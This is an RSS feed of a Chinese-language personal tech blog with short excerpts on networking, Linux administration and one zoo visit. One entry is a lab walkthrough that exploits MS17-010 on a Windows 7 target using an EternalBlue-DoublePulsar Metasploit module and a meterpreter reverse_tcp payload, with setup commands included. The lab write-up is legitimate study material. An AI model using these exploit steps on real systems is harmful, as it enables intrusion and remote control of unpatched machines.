30 黑色 31 紅色 32 綠色 33 黃色 34 藍色 35 紫色 36 青綠 37 白色 背景顏色
40 黑色 41 紅色 42 綠色 43 黃色 44 藍色 45 紫色 46 青綠 47 白色 Example #!</description></item><item><title>交換器 image 遺失</title><link>https://cch0124.github.io/blog/2017-12-27-l3-switch-boot-image-not-found/</link><pubDate>Wed, 27 Dec 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-12-27-l3-switch-boot-image-not-found/</guid><description>狀況 今天在弄設備時，我做 erase startup-config 接著 reload。恩&amp;hellip; 成功，但是 VLAN 存在 flash ，所以我就把 erase flash，接著 OH NO NO NO 飄眼淚 QQ，因為 image 配我刪了，又是下班時間，立刻請教 google ，最後有回來了，感謝神明保佑!!!
方法 用 xmodem 救援。
參考資料 cisco</description></item><item><title>Static routes</title><link>https://cch0124.github.io/blog/2017-11-24-static-route/</link><pubDate>Fri, 24 Nov 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-11-24-static-route/</guid><description>Routing table 路由器是一個負責將封包送往目的地的設備，而路由器跟路由器之間必須要分享所學習到的資訊，並且把交換的資訊以到鄰居的成本以和使用什麼路由協定等給記錄至一張表格，而這張表格就是 Routing table。
此篇文章範圍是 Static Route 的概念。
The router decides how to send the packet Static Route 手動輸入 網路有變化，需要人員的管理 無須學習 因此速度快 Dynamic Route 做 Routing Protocol 的設定 耗資源 由 router 之間去做協調 網路有變化，會透過 Routing Protocol 學習 Default route （預設路由）所謂的預設路由就是當不知道要將這個封包送往哪裡的時候，就會採用這個預設路由所指定的路徑。
Example 這邊不描述 IP address 的設定。
目標：
設置 R1 Static Route。 R2 和 R3 都各有一條 Default route。 Set R2 &amp;amp; R3 Default route R2 將來自不存在於路由表的目的地給丟置 10.</description></item><item><title>DHCP</title><link>https://cch0124.github.io/blog/2017-11-11-dhcp/</link><pubDate>Sat, 11 Nov 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-11-11-dhcp/</guid><description>DHCP DHCP（Dynamic Host Configuration Protocol），屬於第七層的 Application Layer。DHCP 此協定運作於 Server-Client 的架構之中，來讓 Client 端取得網路相關的設定，包含 IP Address、Default Route、DNS。Client 端指的是一般電腦設備，而 Server 端就是DHCP Server。
優點 有效節省 IP 減少維護者負擔 容易維護 DHCP 的 port DHCP Server UDP 67 Client UDP 68 DHCP 分配（Allocate）IP 位址方式 動態分配方式 DHCP Server 上設定好一個 IP Address 範圍以及使用期限，以便回收 IP Address，以便給其它 Client。 靜態分配方式 DHCP Server 根據已定義並手動寫入對應表的 MAC 位址與 IP 位址來分配。 自動分配方式 DHCP Server 可以針對事先已經定義好的 IP Address 範圍來分配 IP Address 給 Client 端，IPAddress 的使用是沒有期限，相對的DHCP Server 會記錄 Client 端使用的 IP Address，以避免 IP Address 衝突。 Client 取得 DHCP 設定過程 Discovery（Client端→DHCP Server） Client 端以 Broadcast 找尋 DHCP Server。設定 DHCP Relay Agent，以達到跨網路尋求的步驟。</description></item><item><title>PPP</title><link>https://cch0124.github.io/blog/2017-11-04-ppp/</link><pubDate>Sat, 04 Nov 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-11-04-ppp/</guid><description>PPP 廣域網路協定 廣域網路 廣域網路（Wide Area Network，WAN ）和一般所謂的區域網路不一樣。區域網路通常是指範圍較小的網路區段，可能是同一棟大樓、同一層樓或是一個區域較小的地理位置。 而廣域網路是範圍比較廣的網路區段，一般跨國型的企業都會使用廣域網路來連結位於不同國家的各個分部，好讓資訊能夠相互流通。
PPP 協定 PPP（Point to Point Protocol）協定是普遍被使用的廣域網路協定，如同名稱所示，PPP 協定是指點對點的網路協定，通常用於兩個網路節點的直接連接，例如兩台電腦透過電話線的網路連接，經常使用在寬頻網路連線上。目前許多ADSL 網路服務供應商（ISP ）提供使用者以 PPP 協定的方式撥接到本身的機房，然後再連上網際網路。以往，則大多使用 SLIP（Serial Line Internet Protocol ）協定，該協定採用的是TCP/IP 協定的點對點串列連線的標準。SLIP 協定是很久以前的協定，主要用於串列埠與數據機之間的連線，現在慢慢地已經被 PPP 協定取代。
PPP 協定在廣域網路連線上的定位 PPP 協定算是廣域網路在網路協定第二層封裝協定的種類之一，當網路封包要傳送到廣域網路之前，在網路第二層協定時，就一定會先透過特定的方式進行封裝，而為了保證能使用正確的封裝方式，在設定 Cisco 設備來支援廣域網路時就必須選對正確的封裝協定，而封裝協定的選擇與所使用的廣域網路技術和廣域網路設備有關。 因此，網路管理人員一定要瞭解廣域網路所使用的封裝協定，才能夠正確的選擇並且設定第二層封裝協定。
一般廣域網路的網路協定第二層封裝協定有以下幾個種類：
HDLC PPP SLIP X.25 LAPB 幀中繼（Frame Relay ） ATM 所以 PPP 協定正是其中一種。
PPP RFC 中定義資訊 PPP 協定包含了各種認證方式、加密與解密方式、壓縮資料方式以及 PPP 協定如何與其他網路協定的合作與交互關係。
PPP 協定中的CHAP 協定，也就是握手（Handshake ）協定，用於建立撥號連接。
PPPoE 協定在乙太網路中用於傳輸PPP 協定中的資料，經常使用於ADSL 上。
PPPoA 協定，主要應用在以ATM 網路卡來傳輸PPP 協定的資料。由於PPPoA 使用於ATM 網路，所以也稱為PPPoATM。</description></item><item><title>Iptables</title><link>https://cch0124.github.io/blog/2017-08-14-iptables/</link><pubDate>Mon, 14 Aug 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-08-14-iptables/</guid><description>Iptables on ubuntu 查看 iptables 是否安裝
$ whereis iptables iptables: /sbin/iptables /usr/share/iptables /usr/share/man/man8/iptables.8.gz How Linux Firewall Works Iptables firewall 可用於 Linux 內核中用於過濾 packet
Firewall Types Stateless firewall 封包有設定才放行，沒設定就不放行，所以管理者必須要很清楚所有封包往返的流量，他不會紀錄已出去的封包狀態 只能逐一檢視每個封包，但不能進一步分析封包之間的關聯性 Stateful firewall 可以紀錄封包內的資料（例如 SYN 與 ACK 序號），以便分析不同封包之間的關聯性，因此能夠分辨出不同的 session，做出更精確的防範 Netfilter 包含 tables；這些 tables 包含 chains；chains 包含單獨的 rules。
如果傳遞的 packet 與任何 rules 匹配，則將對該 packet 應用規則 action。
action 包含，accept、reject、ignore、pass 將數據包傳遞給其它規則以進行更多處理。
Netfilter 可以使用 IP address 和 port number 處理傳入或傳出流量。</description></item><item><title>凍物園</title><link>https://cch0124.github.io/life/2017-07-01-freeze-zoo/</link><pubDate>Sat, 01 Jul 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/life/2017-07-01-freeze-zoo/</guid><description>凍物園 交通 我是捷運做到草衙，一號出口翠亨南路走。約 10 ~ 15分鐘可以走到。
門票
全票 320 元 團體和優惠 280 元 租借雪衣 50 元，離場歸還。(但 50 元不會&amp;hellip;) 心得 一進場真的要帶雪衣或羽絨衣，裡面很冷約零下。一進場，滿滿的各種動物冰雕非常的精緻，許多人在那些場景拍照，裡面有類似流滑梯的冰雕，可以上去滑。裡面還有冰屋可以進去走走，雖然對我來說小擠，但我蠻滿足的呵呵。裡面一些內容由讀者們親至去走走看吧!!!對了，眼鏡出來會因為冷熱而有霧需要小心。
圖片分享
待補</description></item><item><title>MS-17-010 實作</title><link>https://cch0124.github.io/project/2017-07-06-ms-17-010/</link><pubDate>Tue, 27 Jun 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2017-07-06-ms-17-010/</guid><description>1. 環境 Kali 64bit（攻擊機） windows7 SP1 64bit（靶機） 2. 利用的模組 github：https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
3. 開始 利用的模組載入 Kali 如下：
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git #把 deps目錄 And eternalblue_doublepulsar.rb 作複製動做，預設是沒有此模組。 cp -r Eternalblue-Doublepulsar-Metasploit/deps/ \ /usr/share/metasploit-framework/modules/exploits/windows/smb/ \ cp -r Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb \ /usr/share/metasploit-framework/modules/exploits/windows/smb/ cp -r Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb \ /usr/share/metasploit-framework/modules/auxiliary/scanner/msf/ 4. 開啟 msfconsole 5. ms17-010 漏洞檢查 use auxiliary/scanner/smb/smb_ms17_010 #接著如下圖作 show options set RHOSTS IP # 設定靶機的IP 6. Exploit ms17-010 由於沒設定靶機 IP，以下進行設置
set RHOSTS IP # 設定靶機的IP #設定 PAYLOAD（因為是 64 bit，所以需要設定）如果是 windows/meterpreter/reverse_tcp，會獲取不到 Session。 set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit #建立不起 Session show options #檢查 set PROCESSINJECT lsass.</description></item><item><title>scanner port</title><link>https://cch0124.github.io/project/2017-06-27-scanner-port-java/</link><pubDate>Tue, 27 Jun 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2017-06-27-scanner-port-java/</guid><description>import java.io.IOException; import java.net.ServerSocket; public class PortScanner{ public void scan(){ for(int i=1; i &amp;lt; 65535 ; i++ ){//port 是 0 - 65535 try{ ServerSocket ss = new ServerSocket(i);// ServerSocket(int port) 建構 }catch(IOException ex){// port 被占用則拋出例外 System.out.println(&amp;#34;Port: &amp;#34;+ i + &amp;#34; Occupied&amp;#34;); } } } public static void main(String[] args) { PortScanner pserver = new PortScanner(); pserver.scan(); } } // 在 TCP 協定中，埠號 0 是被保留的，不可使用。在 UDP 協定中，來源埠號是可以選擇要不要填上，如果設為 0，則代表沒有來源埠號。</description></item><item><title>File Transfer Protocol(FTP)</title><link>https://cch0124.github.io/blog/2017-04-21-ftp/</link><pubDate>Fri, 21 Apr 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-04-21-ftp/</guid><description>FTP 讓我們透過 Network 在 Server 和 Client 之間傳遞檔案。
FTP 傳輸分兩種模式
port FTP 一般狀態，port 為 21，port 20 為傳輸資料 pasv FTP 屬於被動模式，port 也是 21。連線後使用者會跟 server 端要求資料傳輸的 port 常見 FTP 軟體有 Wuftpd、Proftpd、Vsftpd、Pureftpd 等。因為學校是教學 Vsftpd 所以會以這個為主。
environment ubuntu 16 IP 192.168.137.141 vsftpd tool filezilla（驗證） Install FTP $ sudo apt-get install vsftpd -y service enable $ sudo systemctl start vsftpd # 啟動服務 $ sudo systemctl status vsftpd # 查看服務狀態 $ sudo systemctl stop vsftpd # 停用服務 Configuring FTP 通常服務配置檔都在 /etc 目錄下。利用 whereis 可以查找執行檔和原始檔。</description></item><item><title>LVM（Logical Volume Manager）</title><link>https://cch0124.github.io/blog/2017-04-16-lvm/</link><pubDate>Sun, 16 Apr 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-04-16-lvm/</guid><description>什麼是 LVM 可彈性調整檔案磁區大小 Physical Volume, PV（實體卷宗） Volume Group, VG（卷宗群組） Logical Volume, LV（邏輯卷宗） 非效能取向 寫入方式 線性（預設） A partition 用完時，在使用 B partition 交錯（像 RAID 0） 一份資料用兩顆硬碟來寫入的概念 LVM 可以整合多個實體 partition 在一起， 讓這些 partitions 看起來就像是一個磁碟一樣。還可以在未來新增或移除其他的實體 partition 到這個 LVM 管理的磁碟當中。 by 鳥歌
Physical Volume, PV 利用 fdisk 將劃分的硬碟調整 system ID 為 8e
pvcreate 將實體磁區建立為 PV pvscan 列出系統中 PV 磁區 pvdisplay 顯示系統上 PV 狀態 pvremove 將 PV 屬性移除 Volume Group, VG VG 就是 LVM 組合起來的大磁碟，多個 PV 組合而成。</description></item><item><title>SSH</title><link>https://cch0124.github.io/blog/2017-03-22-ssh/</link><pubDate>Wed, 22 Mar 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-03-22-ssh/</guid><description>SSH OpenSSH 是 1999 年基於免費的 SSH 1.2.12 版本開發的開源項目。 OpenSSH 實現的 SSH 功能包括服務端和客戶端，還有私鑰管理等。 SSH protocol 使用加密來保護客戶端和服務器之間的連接。所有用戶身份驗證、命令、輸出和文件傳輸都經過加密，以防止網絡中的攻擊。
配置檔案 /etc/sshd/sshd_config 可做加密選項、身份驗證選項、文件位置、日誌記錄和各種其他參數（port等）
Logging SSH 服務器使用 syslog 系統進行日誌記錄。默認的日誌檔案放置 /var/log/auth.log
基本使用 $ ssh itachi@192.168.222.132 $ ssh -l itachi 192.168.222.132 -p 22 # -l 指定用戶名 # -p 指定 port 第一次登入某個終端時，SSH 客戶端會獲取設備的公鑰及其指紋訊息。
$ ssh -l lab702 192.168.222.132 The authenticity of host '192.168.222.132 (192.168.222.132)' can't be established. ECDSA key fingerprint is SHA256:TmidBei2XVw7f2lqHuSrjfFHsFRz6riglpwY/tKXlXc. Are you sure you want to continue connecting (yes/no)?</description></item><item><title>連續的指令</title><link>https://cch0124.github.io/blog/2017-03-22-multiple-command-/</link><pubDate>Wed, 22 Mar 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-03-22-multiple-command-/</guid><description>使用方式 符號 用意 範例 ; 指令一執行完執行指令二 指令一;指令二 &amp;amp;&amp;amp; 指令一正確執行完，才執行指令二 指令一&amp;amp;&amp;amp;指令二 || 指令一如果執行錯誤，則執行指令二 指令一||指令二 指令輸出導向 導向位置 符號 輸入導向 &amp;lt; 輸出導向 &amp;gt;，若 &amp;raquo; 則是追加</description></item><item><title>系統找尋檔案</title><link>https://cch0124.github.io/blog/2017-02-11-file-dir-management/</link><pubDate>Sat, 11 Feb 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-02-11-file-dir-management/</guid><description>找尋檔案方法 find 尋找特定字串檔案或目錄 常與 -exec 執行 locate 搜尋系統中包含字串的檔案 whereis 尋找指定檔案的執行檔、配置檔等 which 尋找指定檔案 搜尋定義在系統環境路徑 $PATH 之下的檔案</description></item><item><title>ping 指令</title><link>https://cch0124.github.io/blog/2017-01-16-ping/</link><pubDate>Mon, 16 Jan 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2017-01-16-ping/</guid><description>ping 是網路上常見的診斷工具。
用來判斷網路是否可連線 是否有設備連接 ping 是網路中必要的工具。
以下會介紹 ping 的使用以及 ICMP 協定。
ping work 發送 ICMP(Internet Control Message Protocol) 封包至目的端，最後的訊息可以判斷網路狀態的優良。 ICMP 主要用於確定數據是否及時到達預定目的地。當兩個設備透過 Internet 連線時，如果任何數據未到達其預期目的地，則 ICMP 會生成錯誤回傳。常用的終端應用程式 traceroute 和 ping 都使用 ICMP 進行操作。
ping [options] [destination] ping options
-c 指定要發送的 packet 數量 -s 更改 packet 的大小 -v 詳細訊息 -w 指定命令執行結束的時間（以秒為單位）無論命令發送或接收的 packet 數量 -i 可以指定要使用的網路介面 ping destination</description></item><item><title>ARP Protocol</title><link>https://cch0124.github.io/blog/2016-10-02-arp/</link><pubDate>Thu, 12 May 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-10-02-arp/</guid><description>ARP 從本地端電腦傳送封包到你瀏覽的網頁，他會利用 IP Address 把封包傳送至目的地。但，這之間會學習到目的地 Host 的 MAC Address（Media Access Control Address），這樣才能達到準確溝通。在 Ethernet（乙太網路）環境下，Ethernet進行了連線、傳遞訊號等。要用 IP Address 找出 MAC 得要用 ARP（Address Resolution Protocol） ，ARP 屬於 OSI Model 網路層。
ARP 學習 當 R1 想找 PC1，但 R1 什麼都不知道，只認識自己。R1 發送 broadcast 發出一個 ARP Request，ARP Request 包含了PC1 的 IP Address 等，到了 Switch1 進行 flooding 使每個目的端 Host 都接收（因為是 broadcast）。接著，目的端都接收，會進行 ARP reply 的動作，只有符合 R1 要找的 IP 才會進行回覆以 unicast 方式，其餘的 Host 會把此 frame Drop 掉，之後 R1 會把找到的 Host MAC 給記錄到 ARP 表格。</description></item><item><title>ln 指令</title><link>https://cch0124.github.io/blog/2016-05-12-ln/</link><pubDate>Thu, 12 May 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-05-12-ln/</guid><description>軟連結與硬連結 硬連結都指向同一個檔案；軟連結則否。這在進行刪除有著不同差異前者刪除原檔，連結檔還是會存在者；後者則否。
軟連結 就像是 windows 的捷徑，連結著原檔，修改也是修改原本檔案。
$ ln -s filename [linkname] 硬連結 像是實體連結，不能 link 目錄和跨磁區。
$ ln filename [linkname]</description></item><item><title>permission setting</title><link>https://cch0124.github.io/blog/2016-05-09-permission/</link><pubDate>Mon, 09 May 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-05-09-permission/</guid><description>何謂權限 保證該使用者、部門的有效履行。必須具備對某事項進行決策的范圍和程度。不論在哪裡，都會有這種控管，如：學生對老師；老師對主任甚至校長，這過程不是一個人說的算，總不能學生說我要下課，就可以下課。這當然要往上一個層級詢問，直到擁有該權限的人才說的算。這樣子的控管會有一定的保護。
基本權限認知 了解基本權限 三種身分
owner group other 三種權限
read write execute -rw-rw-r-- 1 cch cch 198 Aug 19 17:37 podman.sh # r 讀 # w 寫 # x 執行 # _ 無權限 練習 penguin 來說 fred 帳號可讀寫執行，但對有 group 為 fred 的帳號少了寫的權限，非該帳號和 group 的帳號則只能讀。 redhat 來說 mary 帳號可讀寫，對有 group 為 admin 的帳號只有讀，非該帳號和 group 的帳號則只能讀。 tuxedo 帳號 root 可讀寫，對有 group 為 staff 的帳號只有讀寫，非該帳號和 group 的帳號則只能讀。
變更帳號的擁有者和群組 chown 變更擁有者 chgro 變更群組 權限變更 chmod 權限變更 $ chmod u=rwx,g=rx,o=x filename # u 使用者 # g 群組 # o 其他人 # a 所有 $ chmod 751 filename</description></item><item><title>Ubuntu 上的帳號和群組管理</title><link>https://cch0124.github.io/blog/2016-05-08-account-group-management/</link><pubDate>Sun, 08 May 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-05-08-account-group-management/</guid><description>帳號命名原則 管理者總是讓帳號有一定的統一規則。如：
魯夫就 roof 或 luff 組織單位的分層 itachi_jp 區域分層 zoro_mis 等。 這些都是為了維護和管理阿!!
Account 帳號 在 ubuntu 中，每個使用者都有獨立的 UID（ID Number），系統對帳號的識別以 UID 為準，帳號的名稱僅用在登錄系統上。UID 就像身分證一樣必須唯一（UID 0 以外），有著一對一關係。
UID 為 0 表示為最高權限（root）。 服務帳號會自動建立，UID 通常介於 1~99 手動定義 UID 建議以 1000 開始 # 系統的設定 $ grep UID /etc/login.defs UID_MIN 1000 UID_MAX 60000 #SYS_UID_MIN 100 #SYS_UID_MAX 999 使用者的名稱和 UID 存在 /etc/passwd 使用者會有家目錄 該使用者無適當的權限，則無法讀寫甚至執行檔案 Group 群組 帳號與群組類似，簡稱 GID（Group ID）。
GID 和群組名稱必須唯一（GID 0 例外） GID 儲存在 /etc/passwd 第四欄位；/etc/group 是第三欄位 $ cat /etc/passwd | tail -n 5 cch:x:1000:1000:cch,,,:/home/cch:/bin/bash naruto:x:1001:1001:Test Account:/home/naruto:/bin/bash itahi:x:1002:1002:Test Account:/home/itahi:/bin/bash madara:x:1003:1004::/home/madara:/sbin/nologin brouto:x:1004:1006::/home/brouto:/sbin/nologin $ cat /etc/group | tail -n 5 itahi:x:1002: ftpgroup:x:1003:naruto,madara madara:x:1004: ftpgroup2:x:1005:brouto brouto:x:1006:naruto root 一定是存在系統的，權限為最高的帳號。在 ubuntu 不允許預設 root 登入，須以一般帳號登入再提權。root 的 UID 為 0，帳號 UID 改為 0，則權限與 root 是畫上等號的。</description></item><item><title>IP Routing</title><link>https://cch0124.github.io/blog/2016-04-12-ip-routing/</link><pubDate>Tue, 12 Apr 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-04-12-ip-routing/</guid><description>IP Routing 簡易來說就是我們從台灣主機到美國 google 主機，所經過的路徑過程。過程之間都是透過路由器的決策來完成。路由器會得知目的地 IP，藉由路由表決定下一跳的路徑，接著轉發封包。
假設 TW 想要取得 Google 的資訊，但是 Google 在跟 TW 不同的網路上。TW 會發送封包至路由器，路由起接收到封包後，會得知目的地 IP 位址，並對照路由表做決策再將 TW 發送至路由器的封包轉發到跟目標網路關聯的介面，最後抵達 Google。
Gateway 本地端主機要和遠方的主機通訊。當主機沒有遠方的主機路由資訊時，會發送至 Gateway。該 Gateway 的路由器會再做決策。
如上面的圖
TW 設置有路由器其中一個介面的 IP，TW 嘗試與遠方不同網路的 google 通訊。TW 在路由表中查找目標網路是否有路徑可到達。如果未找到該路徑，則 TW 將封包發送至路由器上的 TW Gateway IP。路由器接收風包後並將封包轉發給 google。
Routing Table 路由器會維護一個路由表並儲存在 RAM 中。路由器使用路由表來確定到目標網路的路徑。 每個路由表包含以下資訊：
R1#show ip route Codes: L - local, C - connected, S - static, R - RIP, M - mobile, B - BGP D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2 E1 - OSPF external type 1, E2 - OSPF external type 2 i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2 ia - IS-IS inter area, * - candidate default, U - per-user static route o - ODR, P - periodic downloaded static route, H - NHRP, l - LISP + - replicated route, % - next hop override Gateway of last resort is not set 192.</description></item><item><title>Ubuntu 上的 package 管理</title><link>https://cch0124.github.io/blog/2016-04-12-package-management/</link><pubDate>Tue, 12 Apr 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-04-12-package-management/</guid><description>ubuntu package 說明 deb 為 ubuntu/debian 套件檔案的附檔名 類似 redhat/centos 的 rpm 是個包裹檔案，包含著配置檔、執行檔和暫存檔 命名格式 &amp;ldquo;套件名稱_版本_更新次數_適合的硬體平台&amp;rdquo;.deb postfix_2.11.0-1_i386.deb 硬體平台 i386 適合 x86 平台 amd64 適合 64 位元平台 noarch 無任何硬體限制 dpkg 操作 dpkg 為 debian PacKaGe 簡稱，為 debian/ubuntu 主要套件管理指令（安裝、升級、移除）
dpkg -c # 列出套件檔案的內容 dpkg -f # 列出套件的控制訊息 dpkg -l # 列出套件的詳細資訊 dpkg -L # 列出套件所安裝的檔案 dpkg -i # 安裝指定套件 dpkg -r # 移除套件 dpkg -P # 完全移除套件，不保留設定檔 dpkg-reconfigure # 重新設定套件安裝 -a # 重新設定所有使用 debconf 安裝的套件 -u # 預設會在畫面上顯示問題 -force # 強迫重新設定套件 轉換 rpm 與 deb 套件 alien # 轉換 rpm 與 deb 套件 --to-deb（-d） # 產生 debian 套件 --to-rpm（-r） # 產生 rpm 套件 --to-tgz（-t） # 產生 tgz 套件 --test（-T） # 測試 deb 套件 套件安裝</description></item><item><title>子網路切割</title><link>https://cch0124.github.io/blog/2016-03-30-subnetting/</link><pubDate>Wed, 30 Mar 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-03-30-subnetting/</guid><description>子網路 子網路劃分將網路切成多個小規模的網路，以提高路由效率、增強網路管理的安全也減小了廣播的功能。
如下示意圖
假設在一層大樓中，有分軟體部門、硬體部門、UI/UX 部門，將所有主機都分配至 192.168.0.0/24 子網路中。缺點會有以下：
廣播域問題 所有主機都在同一個廣播域中。所有主機都將處理網路上任何設備發送的廣播。應該要讓硬體部門的網路流量不影響其它部門，這樣可以提升效能。 網路上的安全 每個設備都可以訪問子網上的任何其他設備，這可能會帶來安全問題。例如，軟體部門有敏感訊息的服務將與其它的部門工作站位於同一網路中。 組織問題 部門盡量不要在同一子網路中 規劃之後
在規劃之後每個部門分配在不同子網中也位於不同的廣播域。</description></item><item><title>交換器基本介紹</title><link>https://cch0124.github.io/blog/2016-03-28-switch/</link><pubDate>Mon, 28 Mar 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-03-28-switch/</guid><description>Switch 在網路設備中負責轉發網路封包。但，轉發這動作之前，Switch 也必須知道封包轉發的目的地以及要從哪一個埠轉發出去。
Switch 主要功能 能夠增加網路的可用頻寬 製作出 MAC table 分析其中的來源端與目的端的 MAC 位址 藉由 MAC table 正確的轉發網路封包 擁有較高速的內部結構 擁有比較多的埠介面 跟傳統的閘道器（Bridge）比較起來，交換器能夠提供更多的網路流量 MAC 位址學習 Switch 會從它們的埠上監聽所傳進來的 Frame（經過交換器的網路封包稱之為 Frame），檢測這些資料的來源端 MAC 位址，並且把 MAC 位址與埠號的對應關係記錄下來，儲存在本地端的 MAC Address Table 或是 Content-addressable Memory (CAM) Table。 當 Switch 再次收到 Frame，會先至 MAC Address Table 中察看哪個埠可以轉發至目的地 MAC 位址，如果有在 MAC Address Table，則這 Frame 會從學習到的埠轉發出去，否則這 Frame 會從除了來源埠之外的埠轉發出去。
當 Switch 收到 Frame 之後，一定會從所有其他的埠轉發出去，除了來源埠之外。這種轉發到除來源埠以外的其他埠的動作，稱為「Flooding」。用這種 Flooding 的動作來轉送Frame 很沒有效率，因為會浪費很多網路頻寬。
Switch 傳送 Frame 的模式 Store and Forward 交換器會先把 Frame 完整地接收下來，然後才進行轉發的動作 來源端及目的端的 MAC 位址都能夠被讀取 CRC（Cyclic Redundancy Check）錯誤檢查動作會被執行 檢查失敗，Frame 會被遺棄 確保 Frame 中資料的正確性 較費時 延遲時間與 Frame 的資料長度有關 Cut-Though 雖然有些交換器在這種模式下只想讀取 MAC 位址，但還是有某些交換器會讀取 CRC 值並記錄下錯誤數目。</description></item><item><title>路由器基本介紹</title><link>https://cch0124.github.io/blog/2016-03-22-router/</link><pubDate>Tue, 22 Mar 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-03-22-router/</guid><description>Router 介紹 Routing 是決定網路封包要如何送往外部網路到達目的地的過程 Router 會取得達到路由所必須的資訊，並加以維護，而為了取得並維護這樣的路由資訊，必須使用路由協定 最主要的工作是決定要將網路封包送往何處 為了要讓封包送往目的地，必須學習以下
知道目的端的位址在哪裡 標示出來源端的位址，並把它學習起來 尋找這個封包可能要送往的路徑有哪些 從可能的路徑中選出最佳路徑 維護並更新這些路由所需的資料 Switch 也可以把封包轉發到目的地，它與 Router 運作方式不同。
路由器轉發封包決定方式 根據 Routing Table 的資料來決定如何轉發資料封包
Static Route 手動輸入 速度快 不須要經過學習 網路拓樸若有任何的改變，管理人員必須更新這些資料到路由器設備中 比較適合幾乎不會有變動的網路拓樸 Dynamic Route 不須要手動輸入 路由器設備之間去協調 互相交換並學習這些資料 只要做 Routing Protocol 的設定 較耗費系統資源，速度也稍微慢 系統需要時間去做學習的動作 需要一點時間才能把 Routing Table 建立得比較完整\ 網路架構有任何的改變，路由設備會自我學習維護 Routing Table Administrative Distance 來決定每一種不同路由協定的可靠程度 AD 值是一個從 0～255 的整數，每一種路由協定都有一個 AD 值與之對應 其值越低，代表可靠程度越高 路由方式對應 AD 值 路由方式 AD 預設值 直連 0 靜態路由 1 EIGRP Summary Route 5 外部 BGP 20 EIGRP 90 IGRP 100 OSPF 110 RIPv1、RIPv2 120 EGP(Exterior Gateway Protocol) 140 External EIGRP 170 Internal BGP 200 DHCP-learned 254 未知 255 Autonomous System 自治系統（Autonomous System）簡稱 AS，所有處於同樣管理網域（Administrative Domain）下所有網路的集合</description></item><item><title>TCP wrapper</title><link>https://cch0124.github.io/blog/2016-02-27-tcp-wrapper/</link><pubDate>Sat, 27 Feb 2016 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-02-27-tcp-wrapper/</guid><description>TCP wrapper 簡易 TCP 連線存取限制工具 修改設定檔即時生效，因此不必重啟服務 設定檔 /etc/hosts.allow /etc/hosts.deny 限制多，須檢查服務是否支援 $ ldd /usr/sbin/sshd ... libwrap.so.0 =&amp;gt; /lib/x86_64-linux-gnu/libwrap.so.0 (0x00007fd754b92000) ... $ ldd /usr/sbin/nginx # 無 libwrap 因此不支援 格式
執行檔名:來源位置:規則 Example 讓 sshd 只信任 192.168.221.0 和 192.168.18.0 全網段連線，其餘阻擋
$ vi /etc/hosts.allow ALL:127.0.0.1 [::1] sshd:192.168.221. 192.168.18. $ vi /etc/hosts.deny sshd:ALL</description></item><item><title>sudo and su</title><link>https://cch0124.github.io/blog/2016-02-27-sudo-su/</link><pubDate>Tue, 11 Aug 2015 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2016-02-27-sudo-su/</guid><description>sudo 與 su sudo 能夠限制指定使用者在指定主機運行某些命令 有 log 紀錄使用者使用 sudo 做哪些事情 /var/log/auth.log 可用時間戳方式給予使用者限定時間內的權限 指令 visudo 設定檔在 /etc/sudoers，建議是不要直接動這個檔案 su 使用者切換 su -，直接升等為 root，並載入相關設定檔，要輸入 root 密碼 su 切換至 root 權限，但不載入配置 使用者提升最高權限 $ visudo &amp;lt;user&amp;gt; ALL=(ALL) NOPASSWORD:ALL</description></item><item><title>使用者操作 - Ubuntu</title><link>https://cch0124.github.io/blog/2015-08-11-account-management/</link><pubDate>Tue, 11 Aug 2015 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2015-08-11-account-management/</guid><description>useradd 選項 參數 說明 -c 註解 指定帳號的註解文字 -g 主要群組名稱或 GID 指定帳號的主要群組 -G 附加群組名稱或 GID 指定帳號所屬的附加群組 -d 目錄 指定家目錄 -e 日期 指定新建帳號的使用到期日，過期該帳號無法使用 -u UID 指定帳號的 UID 編號 新增使用者 # useradd testuser # id testuser # id 列出使用者資訊 uid=1002(testuser) gid=1003(testuser) groups=1003(testuser) 指定群組 # useradd -g rd eric # -g 指定群組 # id eric uid=1003(eric) gid=1001(rd) groups=1001(rd) 移除使用者 # userdel USER #無法刪除該使用者家目錄 # userdel -r USER #刪除使用者和家目錄 usermod 選項 參數 說明 -c 註解 改變帳號的註解文字 -g 主要群組名稱或 GID 改變帳號的主要群組 -G 附加群組名稱或 GID 改變或增加帳號所屬的附加群組 -d 目錄 改變家目錄 -e 日期 